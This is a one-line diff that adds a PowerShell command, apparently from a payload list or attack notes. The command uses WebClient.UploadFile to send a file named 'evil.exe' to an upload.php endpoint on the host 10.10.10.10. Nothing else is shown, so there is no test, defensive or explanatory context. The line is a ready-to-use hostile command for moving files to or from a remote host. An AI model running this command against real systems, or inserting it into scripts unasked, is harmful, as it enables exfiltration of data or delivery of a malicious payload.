@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).UploadFile('http://10.10.10.10/upload.php','evil.exe')
